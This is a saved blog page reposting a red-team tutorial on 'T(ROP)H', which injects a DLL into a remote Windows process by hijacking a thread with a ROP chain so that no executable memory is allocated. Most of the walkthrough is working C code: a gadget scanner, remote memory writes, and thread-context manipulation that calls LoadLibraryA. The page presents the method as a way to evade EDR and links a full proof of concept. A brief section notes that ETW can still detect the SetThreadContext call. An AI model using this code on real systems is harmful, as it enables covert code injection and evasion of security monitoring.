@@ -1,0 +1,489 @@
+# https://core-jmp.org/2026/03/stealth-injection-with-rop-thread-hijacking-without-executable-memory/
+
+<!DOCTYPE html><!--[if IE 9 ]>   <html class="no-js oldie ie9 ie" lang="en-US" > <![endif]--><!--[if (gt IE 9)|!(IE)]><!--><html class="js audio canvas fullscreen svg video cssanimations boxshadow csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox csscalc no-flexboxtweener cssgradients csstransforms supports csstransforms3d csstransitions objectfit object-fit cssclippathsvg cssclippathinset cssclippathcircle cssclippathellipse cssclippathpolygon" lang="en-US" style=""><!--<![endif]-->
+
+
+<body class="wp-singular post-template-default single single-post postid-2063 single-format-standard wp-custom-logo wp-theme-phlox phlox aux-boxed aux-resp aux-hd aux-page-animation-off aux-dom-ready" data-framed="">
+
+
+<div id="inner-body">
+
+    <!-- end header -->
+             <!-- end page header -->
+        
+    <main id="main" class="aux-main aux-territory  aux-single aux-boxed-container aux-content-top-margin right-sidebar aux-has-sidebar aux-sidebar-style-border aux-user-entry">
+        <div class="aux-wrapper">
+            <div class="aux-container aux-fold">
+
+                <div id="primary" class="aux-primary">
+                    <div class="content" role="main">
+
+                                                            <article class="aux-simple-context post-2063 post type-post status-publish format-standard has-post-thumbnail hentry category-edr category-injection category-redteam category-rop category-winapi category-windows tag-dll-injection tag-edr-evasion tag-exploit-development tag-offensive-security tag-process-injection tag-red-team-techniques tag-rop-return-oriented-programming tag-thread-hijacking tag-windows-internals tag-windows-x64-calling-convention">
+
+                                                                                        <div class="entry-media">
+                                                <div class="aux-media-frame aux-media-image aux-image-mask"><a href="https://core-jmp.org/2026/03/stealth-injection-with-rop-thread-hijacking-without-executable-memory/"><img width="300" height="300" src="https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.05.17-300x300.png" class="aux-attachment aux-featured-image attachment-300x300 aux-attachment-id-2064 " alt="Stealth Injection with ROP: Thread Hijacking Without Executable Memory" data-ratio="1" data-original-w="1536"></a></div>                                            </div>
+                                                                                        <div class="entry-main">
+
+                                                
+
+                                                                                                <div class="entry-info ">
+                                                                                                        <div class="entry-date"><time datetime="2026-03-27T12:13:18+00:00">March 27, 2026</time></div>
+                                                                                                        <div class="entry-author">
+                                                        <span class="meta-sep">by</span>
+                                                        <span class="author vcard">
+                                                            <a href="https://core-jmp.org/author/oxfemale/" rel="author" title="View all posts by oxfemale">
+                                                                oxfemale                                                            </a>
+                                                        </span>
+                                                    </div>
+                                                                                                        <div class="entry-comments">
+                                                        <span class="meta-sep">with</span>
+                                                        <span class="meta-comment">no comment</span>
+                                                    </div>
+                                                                                                        <div class="entry-tax">
+                                                                                                                <a href="https://core-jmp.org/security/edr/" title="View all posts in EDR" rel="category">EDR</a><a href="https://core-jmp.org/security/windows/injection/" title="View all posts in Injection" rel="category">Injection</a><a href="https://core-jmp.org/security/redteam/" title="View all posts in RedTeam" rel="category">RedTeam</a><a href="https://core-jmp.org/security/rop/" title="View all posts in ROP" rel="category">ROP</a><a href="https://core-jmp.org/security/windows/winapi/" title="View all posts in winapi" rel="category">winapi</a><a href="https://core-jmp.org/security/windows/" title="View all posts in windows" rel="category">windows</a>                                                    </div>
+                                                                                                    </div>
+                                                
+                                                <div class="entry-content">
+                                                    <form method="get" action="https://core-jmp.org/wp-admin/admin-post.php" style="text-align:center; margin:10px 0;"><input type="image" src="https://core-jmp.org/wp-content/plugins/post-to-pdf-exporter/assets/image/pdf.png" alt="Download PDF" style="max-width:50px;"></form>
+<p><a href="https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca">Original text</a> by <a href="https://medium.com/@umarex01?source=post_page---byline--d746c102a9ca---------------------------------------">Umarex</a></p>
+
+
+
+<p><em>The article introduces a technique called&nbsp;<strong>T(ROP)H (Thread Hijacking with ROP)</strong>, which enables DLL injection into a remote Windows process without allocating executable memory. Traditional thread hijacking typically allocates memory with execute permissions and places shellcode there before redirecting a thread’s instruction pointer to the payload. However, allocating executable memory is a strong indicator of malicious activity and is often monitored by security solutions. The presented method avoids this by combining&nbsp;<strong>thread hijacking with Return-Oriented Programming (ROP)</strong>. Instead of injecting shellcode, the technique writes the path of a DLL into the target process memory and constructs a small&nbsp;<strong>ROP chain</strong>&nbsp;that prepares the required registers and calls&nbsp;<code>LoadLibraryA</code>&nbsp;to load the DLL. A key challenge is that&nbsp;<code>SetThreadContext</code>&nbsp;cannot directly modify certain volatile registers needed for function arguments, such as&nbsp;<strong>RCX in the Windows x64 calling convention</strong>. To solve this, the attacker locates gadgets such as&nbsp;<strong><code>pop rcx; ret</code></strong>&nbsp;in system libraries (e.g.,&nbsp;<code>ntdll.dll</code>) and uses them to control execution flow. The result is a stealthier injection method that reduces typical detection indicators while still achieving remote code execution.</em></p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="1279" height="1023" src="https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.06.22.png" alt="" class="wp-image-2065"></figure>
+
+
+
+<h2 class="wp-block-heading" id="bffd">TL;DR</h2>
+
+
+
+<p id="769d">Allocating memory with&nbsp;<strong>EXECUTE&nbsp;</strong>privileges in the context of another process is a well-known IOC, as it suggests that some code may be preparing to execute in a space outside of the attacker’s original process.</p>
+
+
+
+<p id="772b">Traditional thread hijacking involves writing shellcode into a memory area with execution privileges and then redirecting the&nbsp;<strong>RIP&nbsp;</strong>to execute it.</p>
+
+
+
+<p id="8b2f">An alternative approach is to load a DLL, which avoids the need for executable memory allocation. However, this introduces a new challenge: passing the argument to LoadLibrary.</p>
+
+
+
+<p id="6286">The&nbsp;<strong>SetThreadContext&nbsp;</strong>API does not allow overwriting of volatile registers such as&nbsp;<strong>RCX</strong>, which is required to pass the argument. This limitation can be circumvented by constructing a small ROP chain that allows the necessary register to be manipulated and the injected DLL to be successfully executed.</p>
+
+
+
+<h2 class="wp-block-heading" id="07dd">CODE WALKTHROUGH</h2>
+
+
+
+<h3 class="wp-block-heading" id="8cb7">1. Find Gadget</h3>
+
+
+
+<p id="f762">The first thing we need to do is find a suitable ROP gadget. In this case, we need to populate the RCX register because the&nbsp;<a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170" rel="noreferrer noopener" target="_blank">Windows x64 calling convention</a>&nbsp;says that the first function argument is passed via RCX. We need to find a gadget that does a ‘pop rcx’ followed by a ‘ret’. This lets us transfer the full path of the DLL from the stack into the RCX register. Once we’ve done that, we can jump straight to the ‘LoadLibraryA’ function in ‘kernel32.dll’.</p>
+
+
+
+<p id="cd40">One good approach could be to start with a quick analysis of system libraries using tools like&nbsp;<a href="https://github.com/JonathanSalwan/ROPgadget" rel="noreferrer noopener" target="_blank">ROPGadget</a>. Once you’ve found a suitable gadget, the next step is to locate its address at runtime. You can do this using a function similar to the one shown below, which dynamically retrieves the address of the ‘pop rcx; ret’ gadget from ‘ntdll.dll’.</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs php">BOOL FindGadgetInFunction(<span class="hljs-keyword">const</span> CHAR* moduleName, BYTE* gadget, SIZE_T gadgetSize, LPVOID* oFoundAddress)
+{
+ HMODULE hModule = GetModuleHandleA(moduleName);
+ <span class="hljs-keyword">if</span> (hModule == <span class="hljs-keyword">NULL</span>)
+  <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;
+
+ PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+ PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader-&gt;e_lfanew);
+ PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+
+ BYTE* addressStart = (BYTE*)hModule;
+ DWORD textSectionSize = pSectionHeader-&gt;Misc.VirtualSize;
+
+ <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; textSectionSize - <span class="hljs-number">3</span>; i++) {
+  <span class="hljs-keyword">if</span> (memcmp(addressStart + i, gadget, gadgetSize) == <span class="hljs-number">0</span>) {
+   *oFoundAddress = (LPVOID)(addressStart + i);
+   FreeLibrary(hModule);
+   <span class="hljs-keyword">return</span> <span class="hljs-keyword">TRUE</span>;
+  }
+ }
+
+ FreeLibrary(hModule);
+ <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;
+}</code></pre>
+
+
+
+<h3 class="wp-block-heading" id="df8a">2. Write the DLL path into the target process’s memory.</h3>
+
+
+
+<p id="ece7">Next, you need to write the path of the DLL you want to inject into the target process’s memory. This is normally done using the standard method of allocating memory in the remote process with ‘VirtualAllocEx’, and then writing the full DLL path into this allocated space using ‘WriteProcessMemory’.</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs php"><span class="hljs-comment">// Allocate rw memory in the target process for the DLL path</span>
+ pRemoteDllPath = VirtualAllocEx(hProcess, <span class="hljs-keyword">NULL</span>, strlen(dllPath) + <span class="hljs-number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+ <span class="hljs-keyword">if</span> (pRemoteDllPath == <span class="hljs-keyword">NULL</span>) {
+  printf(<span class="hljs-string">"[-] Remote memory allocation failed\n"</span>);
+  PrintLastError();
+  <span class="hljs-keyword">goto</span> <span class="hljs-keyword">Exit</span>;
+ }
+ printf(<span class="hljs-string">"[+] Remote memory allocated successfully: %p\n"</span>, pRemoteDllPath);
+
+ <span class="hljs-comment">// Write the DLL path into the allocated memory in the target process</span>
+ <span class="hljs-keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, strlen(dllPath) + <span class="hljs-number">1</span>, <span class="hljs-keyword">NULL</span>)) {
+  printf(<span class="hljs-string">"[-] Failed to write to the target process memory\n"</span>);
+  PrintLastError();
+  VirtualFreeEx(hProcess, pRemoteDllPath, <span class="hljs-number">0</span>, MEM_RELEASE);
+  <span class="hljs-keyword">goto</span> <span class="hljs-keyword">Exit</span>;
+ }
+ printf(<span class="hljs-string">"[+] DLL path successfully written to the target process memory\n"</span>);</code></pre>
+
+
+
+<h3 class="wp-block-heading" id="1f96">3. Modify remote thread context</h3>
+
+
+
+<p id="768b">Now things are getting interesting. Once we’ve found the target remote thread, we can update the stack and registers we’ve got control of. This includes the instruction pointer (RIP) and the stack pointer (RSP).</p>
+
+
+
+<p id="d9a4">There are a few key steps to follow to get the ROP chain working and load the DLL into the target process:</p>
+
+
+
+<ul class="wp-block-list">
+<li><strong>Suspend the Thread:&nbsp;</strong>First, we use the ‘SuspendThread’ API to suspend the target thread. This lets us safely modify its context without interfering with its ongoing execution.</li>
+
+
+
+<li><strong>Modify the RIP and RSP registers</strong>: The RIP is updated to point to the address of our ROP gadget (the ‘pop rcx; ret’ sequence). The RSP is adjusted to allocate 32 bytes (4 DWORD64) on the stack.</li>
+
+
+
+<li><strong>Prepare and write the buffer to the stack</strong>: The buffer contains the necessary values for the ROP chain execution:</li>
+</ul>
+
+
+
+<ol class="wp-block-list">
+<li>At the top of the stack, we put the memory address that holds the path to the DLL we want to inject. When the gadget runs, the ‘pop rcx’ instruction will move this value from the stack into the RCX register.</li>
+
+
+
+<li>Next, we put the address of the ‘LoadLibraryA’ function. After the ‘pop rcx’, the ‘ret’ instruction will pop this address into the RIP register, which will cause the thread to jump to LoadLibraryA and execute it with the path from RCX.</li>
+
+
+
+<li>In the third position, we place the return address for the ‘LoadLibraryA’ function. For simplicity, this points to the ExitThread function, which ensures that the thread terminates cleanly once the DLL is loaded.</li>
+</ol>
+
+
+
+<ul class="wp-block-list">
+<li><strong>Resume the Thread</strong>: thread can be now resumed using ‘ResumeThread’.</li>
+</ul>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs php">  <span class="hljs-comment">// Suspend the thread to modify its context</span>
+ SuspendThread(hRemoteThread);
+ GetThreadContext(hRemoteThread, &amp;threadContext);
+
+ <span class="hljs-comment">// Prepare the buffer with the DLL path and function pointers.</span>
+
+ <span class="hljs-comment">// RCX will hold the address of the DLL path in the target process.</span>
+ <span class="hljs-comment">// This value will be passed to LoadLibraryA after the "pop rcx; ret" gadget is executed.</span>
+ *(DWORD64*)(buffer) = (DWORD64)pRemoteDllPath;
+
+ <span class="hljs-comment">// The next value in the buffer is the return address, which will be the address of LoadLibraryA.</span>
+ <span class="hljs-comment">// After the "pop rcx; ret" gadget, the execution will jump to LoadLibraryA and use the </span>
+ <span class="hljs-comment">// value in RCX (the DLL path) as its argument.</span>
+ *(DWORD64*)(buffer + <span class="hljs-number">8</span>) = (DWORD64)LoadLibraryA;
+
+ <span class="hljs-comment">// After LoadLibraryA finishes executing and the DLL is loaded, the thread should cleanly exit.</span>
+ <span class="hljs-comment">// We ensure that the next value on the stack after the gadget execution is the address of ExitThread.</span>
+ *(DWORD64*)(buffer + <span class="hljs-number">16</span>) = (DWORD64)ExitThread;
+
+ <span class="hljs-comment">// Adjust the stack pointer (RSP). The decrement of 32 bytes ensures that the stack</span>
+ <span class="hljs-comment">// is properly aligned and avoids overwriting any important data.</span>
+ threadContext.Rsp -= <span class="hljs-number">32</span>;
+
+ <span class="hljs-comment">// Set the instruction pointer (RIP) to the gadget "pop rcx; ret".</span>
+ threadContext.Rip = (DWORD64)pPopRcxRetGadgetAddr;
+
+ <span class="hljs-comment">// Write the modified context (buffer) to the target thread's stack</span>
+ <span class="hljs-keyword">if</span> (!WriteProcessMemory(hProcess, (PVOID)(threadContext.Rsp), buffer, <span class="hljs-number">24</span>, <span class="hljs-keyword">NULL</span>)) {
+  printf(<span class="hljs-string">"[-] Failed to write to the target thread's stack\n"</span>);
+  PrintLastError();
+  VirtualFreeEx(hProcess, pRemoteDllPath, <span class="hljs-number">0</span>, MEM_RELEASE);
+  <span class="hljs-keyword">goto</span> <span class="hljs-keyword">Exit</span>;
+ }
+ printf(<span class="hljs-string">"[+] Successfully wrote to the target thread's stack\n"</span>);
+
+ <span class="hljs-comment">// Overwrite the target thread's context with the new values</span>
+ <span class="hljs-keyword">if</span> (!SetThreadContext(hRemoteThread, &amp;threadContext)) {
+  printf(<span class="hljs-string">"[-] Failed to set the target thread's context\n"</span>);
+  VirtualFreeEx(hProcess, pRemoteDllPath, <span class="hljs-number">0</span>, MEM_RELEASE);
+  <span class="hljs-keyword">goto</span> <span class="hljs-keyword">Exit</span>;
+ }
+ printf(<span class="hljs-string">"[+] Thread context successfully overwritten\n"</span>);
+
+ <span class="hljs-comment">// Wait before resuming the thread to ensure the context has been modified</span>
+ Sleep(<span class="hljs-number">2000</span>);
+
+ <span class="hljs-comment">// Resume the hijacked thread</span>
+ ResumeThread(hRemoteThread);
+ printf(<span class="hljs-string">"[+] Remote thread successfully hijacked\n"</span>);</code></pre>
+
+
+
+<h2 class="wp-block-heading" id="dda2">EXECUTION</h2>
+
+
+
+<p id="5baa">The first image shows what the thread looked like before we made any changes to the context. At this point, the thread is paused and its registers and stack are left untouched. The instruction pointer (RIP) is pointing to where the code was originally executed, and the stack pointer (RSP) is managing the current call stack.</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="1919" height="886" src="https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.09.22.png" alt="" class="wp-image-2066"></figure>
+
+
+
+<p>The second image shows what happens to the thread after the context has been modified. At this point, the instruction pointer (RIP) has been updated to point to our ROP gadget (pop rcx; ret), and the stack pointer (RSP) has been adjusted to allocate space for the prepared buffer. The buffer has been written to the stack, along with the DLL path address, the address of the ‘LoadLibraryA’ function, and the return address pointing to ‘ExitThread’.</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="1925" height="916" src="https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.09.34.png" alt="" class="wp-image-2067"></figure>
+
+
+
+<p>And this is what we got!</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="979" height="514" src="https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.10.46.png" alt="" class="wp-image-2068"></figure>
+
+
+
+<p>We can also check if the DLL injection worked by looking at the results in Process Monitor (ProcMon).</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="1078" height="290" src="https://core-jmp.org/wp-content/uploads/2026/03/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-03-27-%D0%B2-13.11.15.png" alt="" class="wp-image-2069"></figure>
+
+
+
+<h2 class="wp-block-heading" id="2051">DETECTABILITY</h2>
+
+
+
+<p id="18be">Although this technique avoids allocating executable memory, it can still be easily detected by EDR because it relies on the well-known ‘SetThreadContext’ API.</p>
+
+
+
+<p id="acca">As well explained in&nbsp;<a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d">David Wells’ post</a>, the API notifies two differents ETW providers during its execution:</p>
+
+
+
+<p id="4007"><em>This step notifies that the&nbsp;SetThreadContext&nbsp;call occurred so that consumers of this provider may be notified. We actually see two different ETW writes occur here, each for different providers:</em></p>
+
+
+
+<p id="a7f0"><strong><em>Microsoft-Windows-Kernel-Audit-API-Calls</em></strong></p>
+
+
+
+<p id="f9d4"><strong><em>Microsoft-Windows-Threat-Intelligence</em></strong></p>
+
+
+
+<p id="0734"><em>From this, it’s clear that&nbsp;SetThreadContext&nbsp;event logging is not just for diagnostic/audit consumers, but also for security consumers. From the little I found online, it appeared some Microsoft security tools, such as Windows Defender APT, consume such Threat-Intel events for EDR purposes, and it makes sense being that&nbsp;SetThreadContext&nbsp;can have malicious usages that should be monitored for.</em></p>
+
+
+
+<h2 class="wp-block-heading" id="311c">CONCLUSIONS</h2>
+
+
+
+<p id="c28e">We’ve seen how to get around the usual memory allocation IOC and API limits by using ROP chains to perform a DLL injection in a Windows x64 environment. By tweaking the thread’s context we were able to run a controlled ROP chain to load a DLL without allocating executable memory.</p>
+
+
+
+<p id="e763">You can find the full proof-of-concept (PoC) implementation, with all the steps and code here:&nbsp;<a href="https://gist.github.com/UmaRex01/20f7a349539ceea76a4ad3d8ce7a6078" rel="noreferrer noopener" target="_blank">https://gist.github.com/UmaRex01/20f7a349539ceea76a4ad3d8ce7a6078</a></p>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-2063" class="share-facebook sd-button share-icon" href="https://core-jmp.org/2026/03/stealth-injection-with-rop-thread-hijacking-without-executable-memory/?share=facebook&amp;nb=1" target="_blank" aria-labelledby="sharing-facebook-2063">
+				<span id="sharing-facebook-2063">Share on Facebook (Opens in new window)</span>
+				<span>Facebook</span>
+			</a></li><li class="share-x"><a rel="nofollow noopener noreferrer" data-shared="sharing-x-2063" class="share-x sd-button share-icon" href="https://core-jmp.org/2026/03/stealth-injection-with-rop-thread-hijacking-without-executable-memory/?share=x&amp;nb=1" target="_blank" aria-labelledby="sharing-x-2063">
+				<span id="sharing-x-2063">Share on X (Opens in new window)</span>
+				<span>X</span>
+			</a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-252212136-2063-69edebc1bf66f" data-src="https://widgets.wp.com/likes/?ver=15.7.1#blog_id=252212136&amp;post_id=2063&amp;origin=core-jmp.org&amp;obj_id=252212136-2063-69edebc1bf66f" data-name="like-post-frame-252212136-2063-69edebc1bf66f" data-title="Like or Reblog"><h3 class="sd-title">Like this:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div><div class="clear"></div>                                                </div>
+
+                                                                                                
+                                                                                            </div>
+
+
+                                            
+    
+
+
+                                            
+                                       </article>
+
+
+<!-- You can start editing here. -->
+
+
+        <!-- If comments are closed. -->
+    <p class="nocomments">Comments are closed.</p>
+
+    
+
+
+
+                    </div><!-- end content -->
+                </div><!-- end primary -->
+
+
+                
+            <!-- end primary siderbar -->
+
+
+            </div><!-- end container -->
+        </div><!-- end wrapper -->
+    </main><!-- end main -->
+
+    <!-- end sitefooter -->
+
+</div><!--! end of #inner-body -->
+
+    <div class="aux-hidden-blocks">
+
+        <section id="offmenu" class="aux-offcanvas-menu aux-pin-left">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="offcanvas-header">
+            </div>
+            <div class="offcanvas-content">
+            </div>
+            <div class="offcanvas-footer">
+            </div>
+        </section>
+        <!-- offcanvas section -->
+
+        <section id="offcart" class="aux-offcanvas-menu aux-offcanvas-cart aux-pin-left">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="offcanvas-header">
+                Shopping Basket            </div>
+            <div class="aux-cart-wrapper aux-elegant-cart aux-offcart-content">
+            </div>
+        </section>
+        <!-- cartcanvas section -->
+
+                <section id="fs-menu-search" class="aux-fs-popup  aux-fs-menu-layout-center aux-indicator">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="aux-fs-menu">
+                        </div>
+            <div class="aux-fs-search">
+                <div class="aux-search-section ">
+                <div class="aux-search-form ">
+            <form action="https://core-jmp.org/" method="get">
+            <div class="aux-search-input-form">
+                            <input type="text" class="aux-search-field" placeholder="Type here.." name="s" autocomplete="off">
+                                    </div>
+                            <input type="submit" class="aux-black aux-search-submit aux-uppercase" value="Search">
+                        </form>
+        </div><!-- end searchform -->
+                </div>
+
+            </div>
+        </section>
+        <!-- fullscreen search and menu -->
+                <section id="fs-search" class="aux-fs-popup aux-search-overlay  has-ajax-form">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="aux-search-field">
+
+            <div class="aux-search-section aux-404-search">
+                <div class="aux-search-form aux-iconic-search">
+            <form action="https://core-jmp.org/" method="get">
+            <div class="aux-search-input-form">
+                            <input type="text" class="aux-search-field" placeholder="Search..." name="s" autocomplete="off">
+                                    </div>
+                            <div class="aux-submit-icon-container auxicon-search-4 ">
+                                        <input type="submit" class="aux-iconic-search-submit" value="Search">
+                </div>
+                        </form>
+        </div><!-- end searchform -->
+                </div>
+
+            </div>
+        </section>
+        <!-- fullscreen search-->
+
+        <div class="aux-scroll-top"></div>
+    </div>
+
+    <div class="aux-goto-top-btn aux-align-btn-right" style="display: block; transform: translateY(150px);"><div class="aux-hover-slide aux-arrow-nav aux-round aux-outline">    <span class="aux-overlay"></span>    <span class="aux-svg-arrow aux-h-small-up"></span>    <span class="aux-hover-arrow aux-svg-arrow aux-h-small-up aux-white"></span></div></div>
+<!-- outputs by wp_footer -->
+
+
+	
+				
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true"><div class="pswp__bg"></div><div class="pswp__scroll-wrap"><div class="pswp__container"><div class="pswp__item"></div><div class="pswp__item"></div><div class="pswp__item"></div></div><div class="pswp__ui pswp__ui--hidden"><div class="pswp__top-bar"><div class="pswp__counter"></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button><button class="pswp__button pswp__button--share" title="Share"></button><button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button><button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class="pswp__preloader"><div class="pswp__preloader__icn"><div class="pswp__preloader__cut"><div class="pswp__preloader__donut"></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class="pswp__share-tooltip"></div> </div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button><button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class="pswp__caption"><div class="pswp__caption__center"></div></div></div></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+	<div src="https://widgets.wp.com/likes/master.html?ver=20260426#ver=20260426" scrolling="no" id="likes-master" name="likes-master" style="display:none;" data-original-tag="iframe">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div src="https://public-api.wordpress.com/wp-admin/rest-proxy/#https://widgets.wp.com" style="display: none;" data-original-tag="iframe">
+
+
+
+
+
+
+</div></div>
+	<div id="likes-other-gravatars" role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
+	<!-- end wp_footer -->
+
+
+</body></html>
